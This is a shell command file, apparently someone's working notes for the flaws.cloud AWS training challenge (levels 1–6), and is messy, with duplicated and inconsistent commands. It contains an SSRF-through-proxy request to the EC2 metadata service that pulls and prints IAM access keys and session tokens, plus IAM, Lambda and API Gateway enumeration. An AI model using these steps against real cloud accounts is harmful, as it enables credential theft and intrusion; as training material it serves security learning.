#*             Configure AWS CLI
#? ----------------------------------------
aws configure set default.region $AWS_REGION
aws configure set aws_access_key_id $AWS_ACCESS_KEY
aws configure set aws_secret_access_key $AWS_SECRET_KEY
aws configure set default.output json

#*             Configure AWS CLI awsS3Admin Profile
#? ----------------------------------------
aws configure set default.region $AWS_REGION --profile $$AWS_NAME
aws configure set aws_access_key_id $AWS_ACCESS_KEY --profile $$AWS_NAME
aws configure set aws_secret_access_key $AWS_SECRET_KEY --profile $$AWS_NAME
aws configure set default.output json --profile $$AWS_NAME

#
#*             Copy Flaws Bucket Levels to Local
#? ----------------------------------------
aws s3 sync $L1_BUCKET_URL --no-sign-request --region $AWS_REGION ./flaws1
aws s3 sync --profile $$AWS_NAME $L2_BUCKET_URL --region $AWS_REGION ./flaws2
aws s3 sync --profile $$AWS_NAME $L3_BUCKET_URL --region $AWS_REGION ./flaws3


#*             Create Flaws Level 4 EC2 Instance with Snapshot as Storage 
#? ----------------------------------------
aws --profile $L4_USER ec2 create-volume --availability-zone $AWS_AZ --region $AWS_REGION  --snapshot-id  $L4_SNAPSHOT_ID
aws ec2 run-instances --profile "$L4_USER" --region "$AWS_REGION" --image-id "$L4_IMAGE" --instance-type "$L4_INSTANCE_TYPE" --key-name "$L4_KEY" --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]" --query 'Instances[0].InstanceId' --output text
# aws ec2 run-instances --profile $L4_USER --region $AWS_REGION --image-id $L4_IMAGE --instance-type $L4_INSTANCE_TYPE --key-name $L4_KEY --query 
aws ec2 describe-instances --profile $L4_USER --query 'Reservations[].Instances[?State.Code==`16`].InstanceId' --output text

#*             Create Flaws Level 4 Named EC2 Instance with Snapshot as Storage 
#? -----------------------------------------------------------------
export INSTANCE_ID=$(
        aws ec2 run-instances --profile "$L4_USER" --region "$AWS_REGION" --image-id "$L4_IMAGE" --instance-type "$L4_INSTANCE_TYPE" --key-name "$L4_KEY" --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=MyInstanceName}]' --query 'Instances[0].InstanceId' --output text
    )
export L4_VM_NAME=Flaws_L4_VM
aws ec2 run-instances --profile $L4_USER --region $AWS_REGION --image-id $L4_IMAGE --instance-type $L4_INSTANCE_TYPE --key-name $L4_KEY --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=$L4_VM_NAME}]' --query 'Instances[0].InstanceId' --output text


# SSH TO NEW INSTANCE 
ssh -i $L4_KEY.pem ubuntu@$L4_URL



#?                                              Level 5
#* --------------------------------------------------------------------------------------------



unset EC2_METADATA_IP
unset L5_EC2_URL
unset L5_EC2_PROXY
unset EC2_IAM_METADATA_URL
unset L5_PROXY_MAIN
unset L5_PROXY_FEED
unset L5_PROXY_NEVERSSL
unset L5_USER
unset L5_ACCESS_KEY
unset L5_SECRET_KEY
unset L5_TOKEN
unset L5_IAM_ROLE

export EC2_METADATA_IP=169.254.169.254
export EC2_METADATA_URL=latest/meta-data
export EC2_IAM_METADATA_URL=iam/security-credentials
export L5_EC2_URL=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
export L5_EC2_PROXY=http://$L5_EC2_URL/proxy
export L5_EC2_METADATA_IP=$L5_EC2_PROXY/$EC2_METADATA_IP
export L5_EC2_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL

export L5_EC2_IAM_METADATA_URL=$L5_EC2_METADATA_URL/latest/meta-data/iam/security-credentials




unset L5_EC2_METADATA_IP
unset L5_EC2_METADATA_URL
unset L5_EC2_IAM_METADATA_URL
export EC2_METADATA_IP=169.254.169.254
export EC2_METADATA_URL=latest/meta-data
export EC2_IAM_METADATA_URL=iam/security-credentials
export L5_EC2_URL=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
export L5_EC2_PROXY=http://$L5_EC2_URL/proxy
export L5_EC2_METADATA_IP=$L5_EC2_PROXY/$EC2_METADATA_IP
export L5_EC2_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL
export L5_EC2_IAM_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL/$EC2_IAM_METADATA_URL
echo $L5_EC2_IAM_METADATA_URL





aws ec2 describe-instances --instance-ids <instance-id> --query 'Reservations[].Instances[].PublicDnsName' --output text
export INSTANCE_ID=$(aws ec2 run-instances --profile "$L4_USER" --region "$AWS_REGION" --image-id "$L4_IMAGE" --instance-type "$L4_INSTANCE_TYPE" --key-name "$L4_KEY" --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=MyInstanceName}]' --query 'Instances[0].InstanceId' --output text)


export L4_VM_NAME=Flaws_L4_VM
aws ec2 run-instances --profile $L4_USER --region $AWS_REGION --image-id $L4_IMAGE --instance-type $L4_INSTANCE_TYPE --key-name $L4_KEY --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]' --query 'Instances[0].InstanceId' --output text
export TAG_SPEC="ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]"
aws ec2 run-instances --profile $L4_USER --region $AWS_REGION --image-id $L4_IMAGE --instance-type $L4_INSTANCE_TYPE --key-name $L4_KEY --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]' --query 'Instances[0].InstanceId' --output text








aws ec2 describe-instances --profile $L4_USER --instance-ids $L4_NEW_VM_ID --query 'Reservations[].Instances[].KeyName' --output text
aws ec2 get-console-output --instance-id $L4_NEW_VM_ID --profile $L4_USER --region $AWS_REGION > console.log







unset L5_ACCESS_KEY
unset L5_SECRET_KEY
unset L5_TOKEN

export AWS_REGION=us-west-2
export L5_USER=flaws
export L5_ACCESS_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.AccessKeyId')
export L5_SECRET_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.SecretAccessKey')
export L5_TOKEN=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.Token')



echo -e "Region: \n$AWS_REGION\n"
echo -e "USER: \n$L5_USER\n"
echo -e "ACCESS KEY: \n$L5_ACCESS_KEY\n"
echo -e "SECRET KEY: \n$L5_SECRET_KEY\n"
echo -e "TOKEN: \n$L5_TOKEN\n"


echo $AWS_ACCESS_KEY
echo $AWS_SECRET_KEY
echo $L5_ACCESS_KEY
echo $L5_SECRET_KEY

aws s3 ls --profile $L5_USER --region $AWS_REGION $L6_BUCKET_URL






#?                                              Level 6
#* --------------------------------------------------------------------------------------------
# "SecurityAudit": This is an AWS policies you can look up either in your console or here
# https://gist.github.com/gene1wood/55b358748be3c314f956#file-all_aws_managed_policies-json-L5664
# "list_apigateways": This is a custom one I made. I bet it'll be useful for this challenge, so we should try to figure out what it is.
#! Prerequisites:
#*?----------------

#* Unset the variables
unset L6_URL
unset BUCKET_URL
unset L6_USER
unset L6_ACCESS_KEY
unset L6_SECRET_KEY
unset L6_IAM_USER

#* Export the variables
export L6_URL=http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
export L6_BUCKET_URL=s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
export L6_USER=L6Profile
export L6_ACCESS_KEY=
export L6_SECRET_KEY=
export L6_IAM_USER=level6

#! Todos:
#?----------------
#TODO 6.0 Create Level 6 Name

#TODO 6.1 Create the L6 profile
./Flaws-Scripts/aws_cli_configure_L6Profile.sh

#TODO 6.2 Get IAM User Info
aws iam get-user --profile $L6_USER --region $AWS_REGION

#TODO 6.3 Get IAM User Attached Policies
export L6_IAM_USER_POLICIES=$(aws iam list-attached-user-policies --user-name "$L6_IAM_USER" --profile "$L6_USER" --region "$AWS_REGION" --query 'AttachedPolicies[].PolicyArn' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" iam get-policy --policy-arn {} --query 'Policy.{PolicyName: PolicyName, PolicyArn: Arn, DefaultVersionId: DefaultVersionId}' --output json | jq -s '.')

#TODO 6.5 Loop through Policies To Get Policy Document with Allowed Actions
policies_full_output=()

for policy in $(echo "$L6_IAM_USER_POLICIES" | jq -c '.[]'); do
    policy_arn=$(echo "$policy" | jq -r '.PolicyArn')
    policy_name=$(echo "$policy" | jq -r '.PolicyName')
    policy_version=$(echo "$policy" | jq -r '.DefaultVersionId')
    policy_document=$(aws --profile $L6_USER iam get-policy-version --policy-arn "$policy_arn" --version-id "$policy_version" --query 'PolicyVersion.Document' --output json)
    policy_dict="{\"PolicyName\":\"$policy_name\",\"PolicyArn\":\"$policy_arn\",\"DefaultVersionId\":\"$policy_version\",\"PolicyDocument\":$policy_document}"
    policies_full_output+=("$policy_dict")
done

# join the policy objects in the array with a comma and surround with square brackets
policies_full_output="[$(IFS=, ; echo "${policies_full_output[*]}")]"
echo $policies_full_output
export L6_IAM_USER_POLICIES_FULL="$policies_full_output"




#TODO 6.6 Using apigateway to GET - List Lamda Functions & Policies
# export L6_EC2_LAMBDA_FUNCTIONS=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[]' --output json)
export L6_EC2_LAMBDA_FUNCTION=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '[:upper:]' '[:lower:]')
export L6_EC2_LAMBDA_POLICY=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.')
export L6_ACCOUNT_ID=$(aws --region $AWS_REGION --profile $L6_USER sts get-caller-identity --query 'Account' --output text)
export L6_EC2_LAMBDA_ARN_STR=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Condition.ArnLike."AWS:SourceArn"')
export L6_EC2_LAMBDA_API=$(echo "$L6_EC2_LAMBDA_ARN_STR" | cut -d ':' -f 6 | cut -d '/' -f 1)
export L6_EC2_LAMBDA_STAGE=$(aws --region $AWS_REGION --profile $L6_USER apigateway get-stages --rest-api-id $L6_EC2_LAMBDA_API --query 'item[0].stageName' --output text)
export L6_EC2_LAMBDA_SERVICE=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Principal.Service' | tr -d '"' | sed 's/\..*//' | uniq )
export L6_EC2_LAMBDA_FUNC_DOMAIN=$(echo "$L6_EC2_LAMBDA_ARN_STR" | grep -oP 'arn:aws:\K\w+-\w+')
export L6_LAMBDA_FINAL_URL="https://$L6_EC2_LAMBDA_API.$L6_EC2_LAMBDA_FUNC_DOMAIN.$AWS_REGION.amazonaws.com/$L6_EC2_LAMBDA_STAGE/$L6_EC2_LAMBDA_FUNCTION"
export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')





echo $L6_EC2_LAMBDA_FUNCTION
echo $L6_EC2_LAMBDA_POLICY
echo $L6_ACCOUNT_ID
echo $L6_EC2_LAMBDA_ARN_STR
echo $L6_LAMBDA_FINAL_URL
echo $L6_FINAL_URL




